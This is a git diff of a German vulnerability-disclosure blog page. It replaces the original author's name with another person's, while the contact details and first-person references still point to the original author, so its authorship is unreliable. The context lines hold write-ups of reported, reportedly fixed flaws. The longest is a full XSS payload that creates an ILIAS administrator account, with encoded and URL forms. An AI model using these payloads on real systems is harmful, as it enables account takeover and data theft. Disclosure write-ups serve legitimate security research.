@@ -27,14 +27,14 @@
 					],
 					"author" :{
 						"@type": "Person",
-						"name":"Rene Rehme",
+						"name":"Matthias Kesenheimer",
 						"email":"contact@renerehme.de"
 					},
 					"datePublished": "2024-01-08T13:56:07+01:00",
 					"dateModified": "2024-01-08T13:56:12+01:00",
 					"publisher" : {
 						"@type": "Organization",
-						"name":"Rene Rehme",
+						"name":"Matthias Kesenheimer",
 						"url":"https:\/\/renerehme.de",
 						"logo":{
 							"@type":"ImageObject",
@@ -50,7 +50,7 @@
         <script src="https://mkesenheimer.github.io/_Resources/Static/Packages/matthias.kesenheimer/JavaScript/Plugins/prism.js" defer></script>
         <script src="https://mkesenheimer.github.io/_Resources/Static/Packages/matthias.kesenheimer/JavaScript/Plugins/chart.js" defer></script>
         <script src="https://mkesenheimer.github.io/_Resources/Static/Packages/matthias.kesenheimer/JavaScript/Main.js?v=1.2.1" defer></script>
-    <title>#1SecFailEverySecondDay - Blog - Rene Rehme</title><meta name="description" content="Ich veröffentliche unter dem Hashtag #1SecFailEverySecondDay bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke, die ich gemeldet habe." /><meta name="robots" content="index,follow" /><link rel="canonical" href="https://mkesenheimer.github.io/blog/1-sec-fail-every-second-day" />
+    <title>#1SecFailEverySecondDay - Blog - Matthias Kesenheimer</title><meta name="description" content="Ich veröffentliche unter dem Hashtag #1SecFailEverySecondDay bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke, die ich gemeldet habe." /><meta name="robots" content="index,follow" /><link rel="canonical" href="https://mkesenheimer.github.io/blog/1-sec-fail-every-second-day" />
 <link rel="alternate" hreflang="x-default" href="https://mkesenheimer.github.io/blog/1-sec-fail-every-second-day" /><link rel="alternate" hreflang="de" href="https://mkesenheimer.github.io/blog/1-sec-fail-every-second-day" />
 <meta name="twitter:card" content="summary_large_image" /><meta name="twitter:creator" content="@ReneReh1" /><meta name="twitter:title" content="#1SecFailEverySecondDay" /><meta name="twitter:description" content="Ich veröffentliche unter dem Hashtag #1SecFailEverySecondDay bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke, die ich gemeldet habe." /><meta name="twitter:image" content="https://mkesenheimer.github.io/_Resources/Persistent/9bc3b5871b47050a6f099b8cfb602da5ae305cfb/card-2000x1410.jpg" /><meta name="twitter:url" content="https://mkesenheimer.github.io/blog/1-sec-fail-every-second-day" /><meta property="og:type" content="article" /><meta property="og:title" content="#1SecFailEverySecondDay" /><meta property="og:description" content="Ich veröffentliche unter dem Hashtag #1SecFailEverySecondDay bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke, die ich gemeldet habe." /><meta property="og:image" content="https://mkesenheimer.github.io/_Resources/Persistent/9041cc5a48f8f49996284fd5cc455bf420ab3d13/card-2560x1805.jpg" /><meta property="og:image:width" content="3163" /><meta property="og:image:height" content="2230" /><meta property="og:image:alt" content="card.jpg" /><meta property="og:url" content="https://mkesenheimer.github.io/blog/1-sec-fail-every-second-day" /></head><body class>
 	<div id="wrapper">
@@ -65,7 +65,7 @@
 				<img height="119" width="119" class="right" alt="logo right" src="https://mkesenheimer.github.io/_Resources/Static/Packages/matthias.kesenheimer/Images/Brand/r-right.svg">
             </div>
             <div class="menu">
-                <nav class="rehme-renerehme-menu"><ul>
+                <nav class="kesenheimer-matthias-menu"><ul>
 
 
 <li class="">
@@ -87,40 +87,40 @@
 		<section id="content">
 			<div class="neos-contentcollection">
 
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-container">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection">
 
-<div class="paddingTop0 paddingBottom0 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom0 kesenheimer-matthias-headline">
 	<div><h1 style="text-align:center">#1SecFailEverySecondDay</h1>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom0 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom0 kesenheimer-matthias-text">
 	<div><p style="text-align:center">Jeden zweiten Tag eine IT-Sicherheitslücke</p>
 </div>
 </div></div>
     </div>
 </div>
 
-<div class="color-white paddingTop0 paddingBottom0 rehme-renerehme-container">
+<div class="color-white paddingTop0 paddingBottom0 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection">
 
-<div class="paddingTop30 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>#1SecFailEverySecondDay</h2>
 </div>
 </div><div class="neos-nodetypes-html">
 	<script>$(function(){function initSparkling(){let t=function(){$(".sparkling-test").each(function(){let t=$(this),a=t.find(".star");a.length>5&&a.each(function(t){0===t&&$(this).remove()}),t.append(n())});let a=Math.round(700*Math.random())+100;setTimeout(t,a)},n=function(){let t=Math.floor(20*Math.random())+10;return'<span class="star" style="top:'+(Math.floor(100*Math.random())-50)+"%; left:"+Math.floor(100*Math.random())+'%;"><svg width="'+t+'" height="'+t+'" viewBox="0 0 68 68" fill="none"><path d="M26.5 25.5C19.0043 33.3697 0 34 0 34C0 34 19.1013 35.3684 26.5 43.5C33.234 50.901 34 68 34 68C34 68 36.9884 50.7065 44.5 43.5C51.6431 36.647 68 34 68 34C68 34 51.6947 32.0939 44.5 25.5C36.5605 18.2235 34 0 34 0C34 0 33.6591 17.9837 26.5 25.5Z" fill="#8475F0" /></svg></span>'};t()}$(function(){initSparkling()});});</script>
 <style>@-webkit-keyframes comeInOut{0%{transform:scale(0)}50%{transform:scale(1)}100%{transform:scale(0)}}@-moz-keyframes comeInOut{0%{transform:scale(0)}50%{transform:scale(1)}100%{transform:scale(0)}}@-o-keyframes comeInOut{0%{transform:scale(0)}50%{transform:scale(1)}100%{transform:scale(0)}}@keyframes comeInOut{0%{transform:scale(0)}50%{transform:scale(1)}100%{transform:scale(0)}}@-webkit-keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(180deg)}}@-moz-keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(180deg)}}@-o-keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(180deg)}}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(180deg)}}.sparkling-test{position:relative;display:inline-block;z-index:0;font-weight:700;color:#8475F0}.sparkling-test>span{z-index:-1;position:absolute;display:block;animation:comeInOut 700ms forwards}.sparkling-test>span>svg{display:block;animation:spin 1000ms linear}</style>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text"><div><p>Ich habe mir was nettes für das Jahr 2024 ausgedacht. Ich veröffentliche unter dem Hashtag <span class="sparkling-test">#1SecFailEverySecondDay</span> bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke / Schwachstelle, die ich in meiner Freizeit bei Organisationen gemeldet habe.</p><p>Natürlich ist nicht immer etwas spektakuläres dabei (sonst bekomme ich die Tage nicht voll). In erster Linie möchte ich damit aufzeigen, dass IT-Security kein Zustand ist und regelmäßige Pentests wichtig sind.</p></div></div>
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text"><div><p>Ich habe mir was nettes für das Jahr 2024 ausgedacht. Ich veröffentliche unter dem Hashtag <span class="sparkling-test">#1SecFailEverySecondDay</span> bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke / Schwachstelle, die ich in meiner Freizeit bei Organisationen gemeldet habe.</p><p>Natürlich ist nicht immer etwas spektakuläres dabei (sonst bekomme ich die Tage nicht voll). In erster Linie möchte ich damit aufzeigen, dass IT-Security kein Zustand ist und regelmäßige Pentests wichtig sind.</p></div></div>
 </div>
 
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Mein Ansatz zur verantwortungsbewussten Offenlegung von Sicherheitslücken</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
 	<div><p>In der Welt der Informationstechnologie ist die Identifizierung von Schwachstellen und Sicherheitslücken von entscheidender Bedeutung, um die Integrität digitaler Systeme zu gewährleisten.</p>
 
 <p>Daher möchte ich betonen, dass ich jede entdeckte Schwachstelle oder Sicherheitslücke verantwortungsbewusst an die jeweiligen Organisationen gemeldet habe.</p>
@@ -130,7 +130,7 @@
 <p>Natürlich gibt es auch Fälle, bei denen die Betroffenen, selbst nach mehrmaliger Meldung überhaupt nicht reagieren oder Sicherheitslücken auch einfach nicht schließen. Solche Fälle könnten hier ggf. auch veröffentlicht werden. Das ist allerdings die Ausnahme und auch nur dann, wenn nicht aktiv personen bezogene Daten im Spiel sind.</p>
 </div>
 </div><div class="neos-nodetypes-html">
-	<div class="rehme-renerehme-warning paddingBottom30">
+	<div class="kesenheimer-matthias-warning paddingBottom30">
   <div style="border: 1px solid #b93737; background: #ffdfdf; padding: 17px; border-radius: 3px; color: #773939; border-left-width: 10px;">
 Sofern Daten abgeflossen sind, wurden diese nach der jeweiligen Ausforschung sicher vernichtet. Ich behalte mir Screenshots mit ggf. personenbezogenen Daten in zensierter oder unkenntlicher Fassung für dieses Writeup vor.
   </div>
@@ -140,29 +140,29 @@ Sofern Daten abgeflossen sind, wurden diese nach der jeweiligen Ausforschung sic
     </div>
 </div>
 
-<div class="color-white paddingTop30 paddingBottom0 rehme-renerehme-container">
+<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection"><div class="neos-nodetypes-html">
 	<div id="tag1"></div>
 </div>
 
 
-<div class="paddingTop30 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h1>Tag 1: Bundesdruckerei</h1>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.bundesdruckerei.de/de">Die Bundesdruckerei-Gruppe</a><br />
 <strong>Betroffene Systeme: </strong>learning-lab.bundesdruckerei.de<br />
 <strong>Schwachstellenmeldung</strong>: 12. Dezember 2023 (fixed)</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Beschreibung</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Es handelte sich um eine reflektierte XSS Schwachstelle mit dem Impact, einen Administrativen Account zu ergattern. Eine OS Command Injection war (sehr wahrscheinlich) ebenfalls durchführbar. Eine User-Interaktion (das Anklicken eines Links) durch einen eingeloggten Administrator, war für die erfolgreiche Ausnutzung notwendig. Diese XSS Schwachstelle konnte in der Theorie kritisch eskaliert werden:<br />
 <br />
 Als Beispiel, könnte ein Angreifer durch Schadcode einen Account mit administrator Rechten erstellen. Hierzu würde es ausreichen einen modifizierten Link durch einen eingeloggten Administrator aufrufen zu lassen. Eine User-Interaktion eines priviligierten Nutzers ist für eine erfolgreiche Ausführung also notwendig.<br />
@@ -176,7 +176,7 @@ Folgende Schritte für eine erfolgreiche Ausführung dieses Scenarios sind hierf
 <p>Die Logik hierfür könnte wie folgt aussehen:</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-code">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
 	<pre class="line-numbers">
 		<code class="language-php">
 			<div>function sendRequest(e,n,d){return new Promise(function(a){var r=new
@@ -227,7 +227,7 @@ Admin eingeloggt!")});</div>
 		</code>
 	</pre>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Diesen Code habe ich in einer lokalen ILIAS Instanz erfolgreich ausführen können. Dabei wird ein</p>
 
 <p>Nutzer "<strong>renereh</strong> " mit dem Passwort "<strong>Idsmwloo80!</strong>" und Adminrechten erstellt. Damit dieser Code über die gefundene XSS Schwachstelle ausgeführt werden kann, muss dieser so enkodiert werden, damit die korrekte Interpretation durch die Übergabe des Schadcodes in einer URL final durch den Browser stattfinden kann. Alternativ könnte der Schadcode auch durch ein externes JS File geladen werden, was aber durch diverse Policies i.d.R geblockt wird (fremder Origin).</p>
@@ -235,7 +235,7 @@ Admin eingeloggt!")});</div>
 <p>Via Base64 wird der Schadcode also wie folgt enkodiert:</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-code">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
 	<pre class="line-numbers">
 		<code class="language-php">
 			<div>ZnVuY3Rpb24gc2VuZFJlcXVlc3QoZSxuLGQpe3JldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihh
@@ -290,18 +290,18 @@ dCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==
 		</code>
 	</pre>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
 	<div><p>Normalerweiße könnte dieser String nun via</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-code">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
 	<pre class="line-numbers">
 		<code class="language-php">
 			<div>https://learning-lab.bundesdruckerei.de/api/&lt;img src=x onerror=eval(atob('<--base64-string-->'))></div>
 		</code>
 	</pre>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
 	<div><p>in der URL verwendet werden.</p>
 
 <p>Problematisch ist, dass im Base64-String das Slash-Zeichen " <strong>/</strong> " vorkommt, was die Logik bei direkter Übermittlung in der URL an dieser Stelle durch die Interpretation eines weiteren Pfadsegmentes unterprechen würde.</p>
@@ -309,29 +309,29 @@ dCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==
 <p>Durch einen kleinen Workaround ist es dennoch möglich. Splittet man den Base64-String in zwei Teile, gibt diese über zwei separate URL Query-Parameter an und fügt sie zur Dekodierung und Interpretation wieder zusammen, kann das Zeichen " <strong>/</strong> " in der URL eliminiert werden:</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-code">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
 	<pre class="line-numbers">
 		<code class="language-php">
 			<div>/api/XXX?param1=Base64Part1&amp;param2=Base64Part2 </div>
 		</code>
 	</pre>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
 	<div><p>Damit das funktioniert, werden die Parts ausgelesen, zusammengesetzt und anschließend via <strong>innerHTML</strong> in den HTML <strong>&lt;body&gt;</strong> geschreiben. Dabei wird ein IMG-Tag verwendet, sobei der Schadcode in eine onerror Attribut überführt wird. Da <strong>src=x </strong>nicht geladen werden kann, wird das Event onerror aktiv, welches final die zusammengesetzte Payload decodiert ( <strong>atob</strong> ) und ausführt ( <strong>eval</strong> ):</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-code">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
 	<pre class="line-numbers">
 		<code class="language-php">
 			<div>const sp = new URLSearchParams(window.location.search);var i = &quot;&lt;img src=x onerror=eval(atob(&#39;&quot;+sp.get(&quot;param1&quot;)+&quot;/&quot;+sp.get(&quot;param2&quot;)+&quot;&#39;))&gt;&quot;;document.body.innerHTML = i;</div>
 		</code>
 	</pre>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
 	<div><p>Dieser Codeschnipsel wird als URL-Pfad nach <strong>/api/</strong> encodiert über ein onerror event angegeben und wird initial ausgeführt. Die finale Payload sieht wie folgt aus:</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-code">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
 	<pre class="line-numbers">
 		<code class="language-php">
 			<div>https://learning-
@@ -390,41 +390,41 @@ BuaWNodCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==</div>
 		</code>
 	</pre>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
 	<div><p>Der Aufruf dieser URL in einem nicht eingeloggten Zustand, erzeugt auf der learning-lab.bundesdruckerei.de Instanz einen Fehler in der Konsole. Sollte der Aufruf durch einen eingeloggten Administrator stattfinden, wird die Logik ausgeführt - sofern ILIAS Standard-Funktionalitäten nicht verändert wurden.</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-quote">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-quote">
 	<div><p>Da hier als Basis eine ILIAS Instanz &lt; v7.26 installiert ist, wäre es mir bei Ausführung dieser XSS Schwachstelle auch potenziell möglich eine Command Injection durchzuführen, um Zugriff auf den Server zu erlangen. Details hierzu können unter der von mir eingereichten <strong>CVE-2023-45869</strong> nachgelesen werden. Ein Exploit wurde von mir zwar nie veröffentlicht, ein potenzieller Angreifer könnte aber die notwendigen Details aus meinem Write-Up ableiten: <a target="_blank" rel="noopener" href="https://rehmeinfosec.de/labor/cve-2023-45869">https://rehmeinfosec.de/labor/cve-2023-45869</a></p>
 </div>
 </div></div>
     </div>
 </div>
 
-<div class="color-white paddingTop30 paddingBottom0 rehme-renerehme-container">
+<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection"><div class="neos-nodetypes-html">
 	<div id="tag3"></div>
 </div>
 
 
-<div class="paddingTop30 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h1>Tag 3: IONOS (1und1)</h1>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.bundesdruckerei.de/de">IONOS SE</a><br />
 <strong>Betroffene Systeme: </strong>ionos.de, logo-generator.ionos.com<br />
 <strong>Schwachstellenmeldung</strong>: 8. Dezember 2022 (fixed)</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Beschreibung</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Die IONOS-Webanwendung war von einer reflektierten XSS-Schwachstelle betroffen, die es ermöglichte, Schadcode über einen URL-Abfrageparameter auszuspielen. Die Payload wurde im Browser unter Verwendung einer URL interpretiert und ausgeführt.</p>
 
 <p>Durch die Ausführung der Payload mittels des Aufrufs eines entsprechenden Links wurde beispielsweise die Umleitung eines Opfers auf eine Phishing-Website ermöglicht oder die Ausführung von Applikationsfunktionen in dessen Kontext. Auch waren Session Cookies auslesbar.</p>
@@ -432,7 +432,7 @@ BuaWNodCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==</div>
 <p>Die Sicherheitslücke konnte in der Anwendung "<em>logo-generator.ionos.com</em>" ausfindig gemacht werden:</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-code">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
 	<pre class="line-numbers">
 		<code class="language-php">
 			<div>https://logo-generator.ionos.com/
@@ -443,11 +443,11 @@ BuaWNodCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==</div>
 		</code>
 	</pre>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Interessant war hier, dass diese Anwendung direkt in der Haupseite unter "<em>ionos.de</em>" über ein iFrame eingebunden wurde. Über das eingebundene iFrame konnte so via "<strong>window.parent.location.href</strong>" die URL eines Angreifers auf der Hauptseite geladen werden.</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-code">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
 	<pre class="line-numbers">
 		<code class="language-php">
 			<div>https://www.ionos.de/tools/logo-erstellen
@@ -458,11 +458,11 @@ BuaWNodCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==</div>
 		</code>
 	</pre>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>In einem Proof of Concept wurde exemplarisch ein Login-Formular integriert, das nicht von IONOS stammte. Auf diese Weise hätten potenzielle Angreifer Zugangsdaten abfangen können:</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-image">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
 	
 <figure>
 	
@@ -482,29 +482,29 @@ BuaWNodCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==</div>
     </div>
 </div>
 
-<div class="color-white paddingTop30 paddingBottom0 rehme-renerehme-container">
+<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection"><div class="neos-nodetypes-html">
 	<div id="tag5"></div>
 </div>
 
 
-<div class="paddingTop30 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h1>Tag 5: Rheinland-Pfalz</h1>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.rlp.de/">Land Rheinland-Pfalz </a><br />
 <strong>Betroffene Systeme: </strong>*.rlp.de<br />
 <strong>Schwachstellenmeldung</strong>: 11. März 2023 (fixed)</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Beschreibung</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Eine Datenbankverwaltung (phpMyAdmin) war ungesichert und öffentlich abrufbar. Es konnten auf Datenbanken eines Datenbankservers ohne Zugangssicherung zugegriffen werden. Ein krimineller Angreifer hätte alle darin enthaltenen Daten lesen, oder verändern können. Die Möglichkeit neue Daten zu schreiben war ebenfalls gegeben.<br />
 &nbsp;<br />
 Enthalten waren z.B.:</p>
@@ -517,7 +517,7 @@ Enthalten waren z.B.:</p>
 </div>
 </div><div class="row paddingTop0 paddingBottom30 neos-nodetypes-twocolumn">
 	<div class="col-lg-8 col-md-6 col-sm-6 col-xs-12 is-page neos-contentcollection">
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-image">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
 	
 <figure>
 	
@@ -534,7 +534,7 @@ Enthalten waren z.B.:</p>
 	
 </figure>
 </div></div><div class="col-lg-4 col-md-6 col-sm-6 col-xs- is-page neos-contentcollection">
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-image">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
 	
 <figure>
 	
@@ -553,36 +553,36 @@ Enthalten waren z.B.:</p>
 </div></div>
 </div>
 
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
 	<div><p>Des weiteren wurde eine ungeschützte Seite innerhalb eines Adminbereichs (<em>/admin/test/</em>) entdeckt. Darüber konnten öffentlich zugänglich interne PDF Dokumente heruntergeladen werden. (z.B. eine Arbeitsanweißung wie die Einrichtung einer Remote Desktop Verbindung (via RDP) mit dem Desktop PC am Arbeitsplatz erfolgt.</p>
 </div>
 </div></div>
     </div>
 </div>
 
-<div class="color-white paddingTop30 paddingBottom0 rehme-renerehme-container">
+<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection"><div class="neos-nodetypes-html">
 	<div id="tag7"></div>
 </div>
 
 
-<div class="paddingTop30 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h1>Tag 7: EDIT.org</h1>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.rlp.de/">EDIT.org </a><br />
 <strong>Betroffene Systeme: </strong>edit.org<br />
 <strong>Schwachstellenmeldung</strong>: 14. Dezember 2021 (fixed)</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Beschreibung</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
 	<div><p>Eine <strong>nohup.out</strong> Datei war im documentRoot abgelegt.</p>
 
 <p>In diesem File waren <strong>173,737 E-Mail Adressen</strong> von Kunden offen einsehbar.</p>
@@ -593,29 +593,29 @@ Enthalten waren z.B.:</p>
     </div>
 </div>
 
-<div class="color-white paddingTop30 paddingBottom0 rehme-renerehme-container">
+<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection"><div class="neos-nodetypes-html">
 	<div id="tag9"></div>
 </div>
 
 
-<div class="paddingTop30 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h1>Tag 9: Küche&amp;Co GmbH - a member of the otto group</h1>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.kueche-co.de">Küche&amp;Co GmbH</a><a target="_blank" rel="noopener" href="https://www.rlp.de/"> </a><br />
 <strong>Betroffene Systeme: </strong>kueche-co.de<br />
 <strong>Schwachstellenmeldung</strong>: 4. Mai 2022 (fixed)</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Beschreibung</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Über einen öffentlich aufrufbaren Link konnte eine 50.8MB .tgz Datei ohne Zugangssicherung heruntergeladen werden: <a target="_blank" rel="noopener" href="https://intranet.kueche-co.de/archive.tgz">https://intranet.kueche-co.de/archive.tgz</a></p>
 
 <p>Dieses Archiv beinhaltete eine Datei mit Kundendaten (Namen, Adressen, Email-Adressen und mehr) .</p>
@@ -625,7 +625,7 @@ Diese Meldung sollte mein erstes Bug Bounty sein, wo tatsächlich eine Prämie i
 </div>
 </div><div class="row paddingTop0 paddingBottom30 neos-nodetypes-twocolumn">
 	<div class="col-lg-6 col-md-6 col-sm-12 col-xs-12 is-page neos-contentcollection">
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-image">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
 	
 <figure>
 	
@@ -642,11 +642,11 @@ Diese Meldung sollte mein erstes Bug Bounty sein, wo tatsächlich eine Prämie i
 	
 </figure>
 </div></div><div class="col-lg-6 col-md-6 col-sm-12 col-xs-12 is-page neos-contentcollection">
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Da ich meine Kontodaten nicht herausgeben und meine Person nicht nennen wollte, hatte ich nach einer anonymen Abwicklung (Amazon Gutschein, Paysafe etc.) gefragt. Ein paar Tage später nochmal nachgehakt und dann diese Antwort bekommen:</p>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom30 rehme-renerehme-image">
+<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
 	
 <figure>
 	
@@ -663,10 +663,10 @@ Diese Meldung sollte mein erstes Bug Bounty sein, wo tatsächlich eine Prämie i
 	
 </figure>
 </div><div class="neos-nodetypes-html">
-	<div class="paddingTop0 paddingBottom15 rehme-renerehme-text"><div><p><span class="sparkling-test">Thrust me bro!</span></p></div></div>
+	<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text"><div><p><span class="sparkling-test">Thrust me bro!</span></p></div></div>
 </div>
 
-<div class="paddingTop0 paddingBottom0 rehme-renerehme-image">
+<div class="paddingTop0 paddingBottom0 kesenheimer-matthias-image">
 	
 <figure>
 	
@@ -688,36 +688,36 @@ Diese Meldung sollte mein erstes Bug Bounty sein, wo tatsächlich eine Prämie i
     </div>
 </div>
 
-<div class="color-white paddingTop30 paddingBottom0 rehme-renerehme-container">
